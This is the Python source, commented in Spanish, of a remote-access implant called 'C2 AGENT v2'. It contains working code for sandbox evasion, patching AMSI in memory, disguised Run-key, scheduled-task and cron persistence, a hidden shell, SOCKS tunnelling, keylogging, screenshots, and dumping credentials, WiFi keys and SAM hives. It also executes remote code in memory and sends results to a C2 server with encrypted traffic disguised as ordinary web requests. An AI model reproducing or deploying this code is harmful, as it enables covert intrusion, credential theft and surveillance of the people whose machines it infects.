"""
╔══════════════════════════════════════════════════════════════╗
║        C2 AGENT v2 - ARQUITECTURA HTTP/HTTPS FILELESS        ║
╚══════════════════════════════════════════════════════════════╝
- Encriptación Dinámica RSA + AES por sesión (Nivel Empresa)
- Evasión SSL/TLS (Tráfico HTTPS)
- Perfiles Malleable C2 + Jittering Aleatorizado
"""

import urllib.request
import urllib.parse
import json
import base64
import os
import sys
import platform
import random
import time
import threading
import subprocess
import ssl
import queue

try:
    from Crypto.Cipher import AES, PKCS1_OAEP
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    import hashlib
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False

# =========================================================
# CONFIGURACIÓN DEL IMPLANTE
# =========================================================
C2_URL = "https://127.0.0.1:5000"
BEACON_INTERVAL = 5   
JITTER = 0.3          

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
    'Spotify/1.1.56.595 (Windows NT 10.0; Win64; x64)'
]

# Permitir conexiones HTTPS Autofirmadas
ssl_context = ssl._create_unverified_context()

class AESCipher:
    def __init__(self, key: bytes):
        if AES_AVAILABLE:
            self.key = hashlib.sha256(key).digest() if len(key) != 32 else key
            
    def encrypt(self, plaintext: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in plaintext])
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return base64.b64encode(iv + ciphertext)
    
    def decrypt(self, encrypted_data: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in encrypted_data])
        raw = base64.b64decode(encrypted_data)
        cipher = AES.new(self.key, AES.MODE_CBC, raw[:16])
        return unpad(cipher.decrypt(raw[16:]), AES.block_size)

class AgentV2:
    def __init__(self):
        self.agent_id = self._generate_id()
        self.cwd = os.getcwd()
        self.running = True
        self.beacon_interval = BEACON_INTERVAL
        self.jitter = JITTER

        # === Anti-Sandbox: Morir silenciosamente en entornos de análisis ===
        if not self._anti_sandbox():
            sys.exit(0)

        self._blind_amsi()
        self._auto_persist()

        # === Keylogger nativo en memoria ===
        self._keylog_buffer = []
        self._keylog_active = False
        self._keylog_thread = None
        self._keylog_lock = threading.Lock()
        
        self.injected_modules = {}
        # Generar llave AES única efímera
        self.aes_key = get_random_bytes(32) if AES_AVAILABLE else b'FallbackInsecureKey____'
        self.aes = AESCipher(self.aes_key)

        # === Módulo 1: Persistent PTY Asíncrona ===
        self.pty_queue = queue.Queue()
        shell_exe = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"
        
        if platform.system() == 'Windows':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            self.pty_process = subprocess.Popen(
                [shell_exe],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                startupinfo=startupinfo,
                creationflags=0x08000000 # CREATE_NO_WINDOW flag
            )
        else:
            self.pty_process = subprocess.Popen(
                [shell_exe],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )
            
        self.pty_thread = threading.Thread(target=self._pty_reader, daemon=True)
        self.pty_thread.start()

        # === Módulo 3: Motor TCP SOCKS5 residente ===
        import socket
        self.tunnels = {}
        self.socks_queue = queue.Queue()
        self.socks_thread = threading.Thread(target=self._socks_reader, daemon=True)
        self.socks_thread.start()

    def _socks_reader(self):
        import select
        while self.running:
            if not self.tunnels:
                time.sleep(0.5)
                continue
                
            try:
                sockets_to_watch = list(self.tunnels.values())
                readable, _, _ = select.select(sockets_to_watch, [], [], 0.5)
                for sock in readable:
                    conn_id = next((k for k, v in self.tunnels.items() if v == sock), None)
                    if conn_id:
                        try:
                            # Leer hasta 8KB y empaquetarlo asíncronamente
                            data = sock.recv(8192)
                            if data:
                                b64data = base64.b64encode(data).decode('utf-8')
                                self.socks_queue.put((conn_id, 'DATA', b64data))
                            else:
                                sock.close()
                                del self.tunnels[conn_id]
                                self.socks_queue.put((conn_id, 'CLOSE', ''))
                        except:
                            sock.close()
                            if conn_id in self.tunnels: del self.tunnels[conn_id]
                            self.socks_queue.put((conn_id, 'CLOSE', ''))
            except:
                time.sleep(0.5)

    def _pty_reader(self):
        # Lee byte a byte del subproceso congelado sin bloquear el pipeline
        while self.running:
            try:
                byte = self.pty_process.stdout.read(1)
                if not byte: break
                codec = 'cp850' if platform.system() == 'Windows' else 'utf-8'
                self.pty_queue.put(byte.decode(codec, errors='replace'))
            except:
                break

    def _anti_sandbox(self) -> bool:
        """Detecta sandboxes y entornos de análisis. Retorna False si sospechoso."""
        if platform.system() != 'Windows': return True
        try:
            # Check 1: Nombres de usuario sospechosos
            username = os.environ.get('USERNAME', '').lower()
            bad_users = {'sandbox','maltest','virus','sample','test','analyst','cuckoo','malware','john'}
            if username in bad_users: return False

            # Check 2: RAM insuficiente (< 1.5 GB = sandbox de análisis)
            import ctypes
            class _MS(ctypes.Structure):
                _fields_ = [('l',ctypes.c_ulong),('_',ctypes.c_ulong),
                            ('t',ctypes.c_ulonglong),('a',ctypes.c_ulonglong)]
            ms = _MS(); ms.l = ctypes.sizeof(ms)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(ms))
            if ms.t < int(1.5 * 1024**3): return False

            # Check 3: Muy pocos procesos corriendo = sandbox aislado
            try:
                r = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
                if r.stdout.count('\n') < 20: return False
            except: pass

            # Check 4: Herramientas de análisis activas
            bad_procs = ['wireshark','procmon','ollydbg','ida64','x64dbg',
                         'procexp','fiddler','charles','burpsuite','httpdebugger']
            try:
                r = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
                t = r.stdout.lower()
                if any(p in t for p in bad_procs): return False
            except: pass
        except: pass
        return True

    def _auto_persist(self):
        """Instala persistencia automática en Run Key + Scheduled Task en primer arranque."""
        if platform.system() != 'Windows': return
        try:
            import winreg, shutil
            target_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])

            # Copiar a %APPDATA%\Microsoft\Windows\Themes\dwm.exe (invisible)
            appdata = os.environ.get('APPDATA', '')
            dest_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'Themes')
            dest = os.path.join(dest_dir, 'dwm.exe')
            if not os.path.exists(dest):
                os.makedirs(dest_dir, exist_ok=True)
                try:
                    shutil.copy2(target_exe, dest)
                    target_exe = dest
                except: pass

            # RunKey en HKCU - menos permisos pero siempre funciona
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'Desktop Window Manager', 0, winreg.REG_SZ, f'"{target_exe}"')
            winreg.CloseKey(key)

            # Scheduled Task como backup (sobrevive al cierre de sesión)
            task_cmd = (f'schtasks /create /tn "Windows Telemetry Service" '
                       f'/tr "\"{target_exe}\"" /sc ONLOGON /ru "{os.environ.get("USERNAME","")}" /f')
            subprocess.run(task_cmd, shell=True, capture_output=True, timeout=10)
        except: pass

    def _keylog_worker(self):
        """Worker nativo - sondeo GetAsyncKeyState sin dependencias"""
        VK_MAP = {
            0x08:'[BS]',0x09:'[TAB]',0x0D:'[ENTER]\n',0x1B:'[ESC]',
            0x20:' ',0x2E:'[DEL]',0x25:'[<]',0x27:'[>]',0x26:'[^]',0x28:'[v]',
        }
        for i in range(0x30,0x3A): VK_MAP[i]=chr(i)         # 0-9
        for i in range(0x41,0x5B): VK_MAP[i]=chr(i+32)    # a-z (lowercase)

        import ctypes
        user32 = ctypes.windll.user32
        while self._keylog_active:
            caps = user32.GetKeyState(0x14) & 1
            shift = bool(user32.GetAsyncKeyState(0x10) & 0x8000)
            for vk in range(8, 255):
                if user32.GetAsyncKeyState(vk) & 0x0001:
                    ch = VK_MAP.get(vk, f'[VK:{hex(vk)}]')
                    if len(ch)==1 and ch.isalpha():
                        ch = ch.upper() if (caps and not shift) or (not caps and shift) else ch.lower()
                    with self._keylog_lock:
                        self._keylog_buffer.append(ch)
            time.sleep(0.01)

    def _blind_amsi(self):
        # === Módulo 2: Parche AMSI Dinámico en Kernel ===
        if platform.system() != 'Windows': return
        try:
            import ctypes
            # Constantes de Opcode: E_INVALIDARG (0x80070057) para forzar "Safe" result.
            patch = b'\xB8\x57\x00\x07\x80\xC2\x18\x00'
            
            kernel32 = ctypes.windll.kernel32
            amsi = ctypes.windll.amsi
            
            # Buscar el ScanBuffer residente en memoria
            func_addr = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
            
            # Quitar bandera ReadOnly al bloque de memoria y dar PAGE_EXECUTE_READWRITE
            old_protect = ctypes.c_uint32(0)
            kernel32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]
            kernel32.VirtualProtect(func_addr, len(patch), 0x40, ctypes.byref(old_protect))
            
            # Re-escribir Ensamblador crudo en caliente
            patch_array = (ctypes.c_char * len(patch)).from_buffer_copy(patch)
            ctypes.memmove(func_addr, patch_array, len(patch))
            
            # Ocultar rastro reinstaurando la protección
            kernel32.VirtualProtect(func_addr, len(patch), old_protect, ctypes.byref(ctypes.c_uint32(0)))
        except Exception:
            pass # Si no existe (Ej: Win 7) o falla, silencioso absoluto
            
    def _generate_id(self):
        return base64.b64encode(os.urandom(6)).decode('utf-8')
        
    def _get_ua(self):
        return random.choice(USER_AGENTS)

    def build_sysinfo(self):
        return {
            'id': self.agent_id,
            'hostname': platform.node(),
            'os': f"{platform.system()} {platform.release()}",
            'username': os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            'cwd': self.cwd
        }
        
    def encode_payload(self, data: dict) -> str:
        json_data = json.dumps(data).encode('utf-8')
        return self.aes.encrypt(json_data).decode('utf-8')

    def decode_payload(self, b64_encoded: str) -> dict:
        try:
            decrypted = self.aes.decrypt(b64_encoded)
            return json.loads(decrypted.decode('utf-8'))
        except Exception as e:
            return {'error': str(e)}

    def handshake(self):
        """Negocia la clave AES efímera con el servidor usando la PKI (Llave Pública)"""
        try:
            # 1. Obtener la llave Pública
            req = urllib.request.Request(f"{C2_URL}/api/v2/get_cert", headers={'User-Agent': self._get_ua()})
            with urllib.request.urlopen(req, context=ssl_context, timeout=10) as r:
                data = json.loads(r.read())
            pub_key_str = data.get('public_key')
            
            if pub_key_str and pub_key_str != "NO_RSA":
                if not AES_AVAILABLE:
                    sys.exit(1)
                
                server_pub_key = RSA.import_key(pub_key_str)
                rsa_cipher = PKCS1_OAEP.new(server_pub_key)
                encrypted_aes = rsa_cipher.encrypt(self.aes_key)
                payload = {
                    'id': self.agent_id,
                    'encrypted_aes': base64.b64encode(encrypted_aes).decode('utf-8'),
                    'info': self.build_sysinfo()
                }
            else:
                return
            
            # 2. Enviar la llave cifrada de vuelta (esto registra al agente en el C2)
            post_data = json.dumps(payload).encode('utf-8')
            req2 = urllib.request.Request(f"{C2_URL}/api/v2/handshake", data=post_data, headers={
                'Content-Type': 'application/json', 'User-Agent': self._get_ua()
            })
            urllib.request.urlopen(req2, context=ssl_context, timeout=10)
        except Exception:
            pass

    def check_in(self):
        safe_id = urllib.parse.quote(self.agent_id)
        url = f"{C2_URL}/api/v2/telemetry"
        headers = { 'User-Agent': self._get_ua(), 'Cookie': f'session_id={safe_id}' }
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, context=ssl_context, timeout=10) as response:
                content = response.read()
                
                # Flushing Asíncrono: Si el PTY está escupiendo texto (ej. scan Nmap)
                # se envía de vuelta inmediatamente en este Check-In.
                out_buffer = ""
                while True:
                    try: out_buffer += self.pty_queue.get_nowait()
                    except queue.Empty: break
                
                if out_buffer:
                    import uuid
                    self.send_response(f"pty_{uuid.uuid4().hex[:8]}", {'output': out_buffer})

                # Flushing Asíncrono de Tráfico SOCKS TCP
                socks_flush = []
                while True:
                    try: socks_flush.append(self.socks_queue.get_nowait())
                    except queue.Empty: break
                
                if socks_flush:
                    self.send_response('SOCKS_DOWNSTREAM', {'payload': json.dumps(socks_flush)})
                    
                if content:
                    payload = self.decode_payload(content)
                    if payload and 'command' in payload:
                        self.process_command(payload)
        except Exception:
            pass

    def send_response(self, task_id: str, data: dict):
        url = f"{C2_URL}/api/v2/update"
        data['id'] = self.agent_id
        data['task_id'] = task_id
        
        payload_str = self.encode_payload(data)
        post_data = urllib.parse.urlencode({'__VIEWSTATE': payload_str}).encode('utf-8')
        headers = {
            'User-Agent': self._get_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'session_id={urllib.parse.quote(self.agent_id)}'
        }
        try:
            req = urllib.request.Request(url, data=post_data, headers=headers)
            urllib.request.urlopen(req, context=ssl_context, timeout=10)
        except Exception:
            pass

    def evaluate_in_memory(self, code_str: str, module_name: str):
        try:
            compiled_code = compile(code_str, '<string>', 'exec')
            module_globals = {}
            exec(compiled_code, module_globals)
            self.injected_modules[module_name] = module_globals
            return True
        except Exception as e:
            return str(e)

    def process_command(self, payload: dict):
        cmd_str = payload.get('command', '')
        task_id = payload.get('task_id', '0000')
        args = payload.get('args', '')
        
        if 'fileless_script' in payload:
            script_content = payload['fileless_script']
            mod_name = args 
            res = self.evaluate_in_memory(script_content, mod_name)
            if res is True:
                self.send_response(task_id, {'output': f'[+] Módulo {mod_name} cargado estáticamente en memoria RAM.'})
            else:
                self.send_response(task_id, {'error': f'[-] Error inyectando módulo: {res}'})
            return

        if cmd_str == 'register':
            pass # Ya manejado por handshake
        elif cmd_str == 'shell':
            try:
                self.pty_process.stdin.write((args + "\n").encode('utf-8'))
                self.pty_process.stdin.flush()
                time.sleep(0.5)
                out_buffer = ""
                while True:
                    try: out_buffer += self.pty_queue.get_nowait()
                    except queue.Empty: break
                self.send_response(task_id, {'output': out_buffer if out_buffer else '...'})
            except Exception as e:
                self.send_response(task_id, {'error': str(e)})
        
        elif cmd_str == 'socks_connect':
            import socket
            try:
                opts = json.loads(args)
                cid = opts["conn_id"]
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((opts["host"], opts["port"]))
                s.setblocking(False)
                self.tunnels[cid] = s
                self.send_response(task_id, {'status': 'connected', 'conn_id': cid})
            except Exception as e:
                if 'cid' in locals():
                    self.send_response(task_id, {'error': str(e), 'conn_id': cid})
                
        elif cmd_str == 'socks_write':
            try:
                opts = json.loads(args)
                cid = opts["conn_id"]
                if cid in self.tunnels:
                    self.tunnels[cid].sendall(base64.b64decode(opts["data"]))
            except:
                pass
                
        elif cmd_str == 'socks_close':
            try:
                cid = args
                if cid in self.tunnels:
                    self.tunnels[cid].close()
                    del self.tunnels[cid]
            except:
                pass

        elif cmd_str == 'sweep':
            if 'network_sweeper' in self.injected_modules:
                try:
                    sweeper_run = self.injected_modules['network_sweeper'].get('run_sweep')
                    if sweeper_run:
                        out = sweeper_run(args)
                        self.send_response(task_id, {'output': out})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'Módulo network_sweeper no está inyectado.'})
        elif cmd_str == 'watch':
            if 'stream_capture' in self.injected_modules:
                try:
                    capture_fn = self.injected_modules['stream_capture'].get('capture_frame')
                    if capture_fn:
                        out = capture_fn(args)
                        if "error" in out:
                            self.send_response(task_id, {'error': out["error"]})
                        else:
                            self.send_response(task_id, {'vision_frame': out["data"], 'target': args})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'Módulo stream_capture no inyectado.'})
        elif cmd_str == 'elevate':
            if 'uac_bypass' in self.injected_modules:
                try:
                    bypass_fn = self.injected_modules['uac_bypass'].get('run_uac_bypass')
                    if bypass_fn:
                        out = bypass_fn()
                        self.send_response(task_id, {'output': out})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'Módulo uac_bypass no inyectado.'})
        elif cmd_str == 'persist':
            target_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            if platform.system() == 'Windows':
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "Windows Defender Updater", 0, winreg.REG_SZ, f'"{target_exe}"')
                    winreg.CloseKey(key)
                    self.send_response(task_id, {'output': '[+] Clave de registro creada. (Persistencia Windows)'})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                try:
                    cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot {target_exe}") | crontab -'
                    os.system(cron_cmd)
                    self.send_response(task_id, {'output': '[+] Cronjob inyectado.'})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
        elif cmd_str == 'sleep':
            try:
                parts = args.split()
                if len(parts) >= 1: self.beacon_interval = float(parts[0])
                if len(parts) >= 2: self.jitter = float(parts[1])
                self.send_response(task_id, {'output': f'[+] Control de Sleep: {self.beacon_interval}s, Jitter: {self.jitter}'})
            except Exception as e:
                self.send_response(task_id, {'error': str(e)})
        elif cmd_str == 'kill':
            self.send_response(task_id, {'output': '[+] Ejecutando auto-destrucción...'})
            self.running = False
            if platform.system() == 'Windows':
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, "Windows Defender Updater")
                    winreg.CloseKey(key)
                except Exception:
                    pass
            script_path = os.path.abspath(__file__)
            if not getattr(sys, 'frozen', False):
                try:
                    os.system(f'start /b cmd /c ping 127.0.0.1 -n 3 > nul & del "{script_path}"')
                except:
                    pass
            sys.exit(0)
        elif cmd_str == 'screenshot':
            if platform.system() != 'Windows':
                self.send_response(task_id, {'error': 'Solo Windows'}); return
            try:
                # Captura nativa via PowerShell + System.Windows.Forms (sin deps)
                ps = (
                    'Add-Type -AssemblyName System.Windows.Forms;'
                    'Add-Type -AssemblyName System.Drawing;'
                    '$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;'
                    '$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);'
                    '$g=[System.Drawing.Graphics]::FromImage($bmp);'
                    '$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);'
                    '$ms=New-Object System.IO.MemoryStream;'
                    '$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg);'
                    '[Convert]::ToBase64String($ms.ToArray())'
                )
                flags = 0x08000000  # CREATE_NO_WINDOW
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                r = subprocess.run(
                    ['powershell', '-WindowStyle', 'Hidden', '-Command', ps],
                    capture_output=True, text=True, timeout=20,
                    startupinfo=si, creationflags=flags
                )
                if r.stdout.strip():
                    self.send_response(task_id, {'screenshot_b64': r.stdout.strip()})
                else:
                    self.send_response(task_id, {'error': 'PowerShell screenshot falló: ' + r.stderr[:200]})
            except Exception as e:
                self.send_response(task_id, {'error': str(e)})

        elif cmd_str == 'credump':
            results = []
            try:
                # 1. Credenciales almacenadas en Windows Credential Manager
                r = subprocess.run('cmdkey /list', shell=True, capture_output=True,
                                   text=True, timeout=8, creationflags=0x08000000)
                if r.stdout.strip(): results.append('[*] CREDENTIAL MANAGER:\n' + r.stdout)

                # 2. Passwords WiFi guardados
                r2 = subprocess.run(
                    'netsh wlan show profiles', shell=True, capture_output=True,
                    text=True, timeout=8, creationflags=0x08000000
                )
                profiles = [l.split(':')[1].strip() for l in r2.stdout.splitlines()
                            if 'Perfil de todos los usuarios' in l or 'All User Profile' in l]
                for prof in profiles[:10]:
                    r3 = subprocess.run(
                        f'netsh wlan show profile "{prof}" key=clear',
                        shell=True, capture_output=True, text=True, timeout=5, creationflags=0x08000000
                    )
                    for ll in r3.stdout.splitlines():
                        if 'Contenido de la clave' in ll or 'Key Content' in ll:
                            results.append(f'[WIFI] {prof}: {ll.split(":")[1].strip()}')

                # 3. Intentar volcar SAM (requiere SYSTEM - funciona post-elevate)
                sp = "C:\\Users\\Public\\sam.tmp"
                tp = "C:\\Users\\Public\\sys.tmp"
                r4 = subprocess.run(f'reg save HKLM\\SAM {sp} /y', shell=True,
                                    capture_output=True, timeout=10, creationflags=0x08000000)
                r5 = subprocess.run(f'reg save HKLM\\SYSTEM {tp} /y', shell=True,
                                    capture_output=True, timeout=10, creationflags=0x08000000)
                if r4.returncode == 0:
                    results.append(f'[+] SAM/SYSTEM dump -> C:\\Users\\Public\\')
                    results.append('[!] Procesa con: secretsdump.py -sam sam.tmp -system sys.tmp LOCAL')
                else:
                    results.append('[-] SAM dump requiere SYSTEM (usa Bypass UAC primero)')

                results.insert(0, f'[+] CREDUMP completado en {platform.node()}')
            except Exception as e:
                results.append(f'[-] Error: {e}')
            self.send_response(task_id, {'output': '\n'.join(results)})

        elif cmd_str == 'keylog_start':
            if self._keylog_active:
                self.send_response(task_id, {'output': '[*] Keylogger ya activo'}); return
            self._keylog_active = True
            self._keylog_buffer = []
            self._keylog_thread = threading.Thread(target=self._keylog_worker, daemon=True)
            self._keylog_thread.start()
            self.send_response(task_id, {'output': '[+] Keylogger nativo activado (ctypes)'})

        elif cmd_str == 'keylog_dump':
            with self._keylog_lock:
                captured = ''.join(self._keylog_buffer)
                self._keylog_buffer = []
            self.send_response(task_id, {'output': captured or '[*] No hay teclas capturadas.'})

        elif cmd_str == 'keylog_stop':
            self._keylog_active = False
            with self._keylog_lock:
                captured = ''.join(self._keylog_buffer)
                self._keylog_buffer = []
            self.send_response(task_id, {'output': f'[+] Keylogger detenido.\n{captured}'})

        else:
            self.send_response(task_id, {'error': 'Comando desconocido'})

    def run(self):
        # Exponential Backoff: Reintentos con espera creciente ante fallos de conexión
        retry_delay = 5
        max_delay = 3600  # Máximo 1 hora entre intentos
        while True:
            try:
                self.handshake()
                retry_delay = 5  # Reset al conectar
                break
            except Exception:
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 2, max_delay)

        while self.running:
            try:
                self.check_in()
            except Exception:
                pass
            sleep_time = self.beacon_interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(sleep_time)

if __name__ == '__main__':
    if platform.system() != 'Windows':
        import os
        try:
            if os.fork() > 0: sys.exit(0)
        except OSError:
            pass
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    
    try:
        agent = AgentV2()
        agent.run()
    except Exception as e:
        import traceback
        with open("C:\\Users\\Public\\c2_crash.txt", "w") as f:
            f.write(traceback.format_exc())
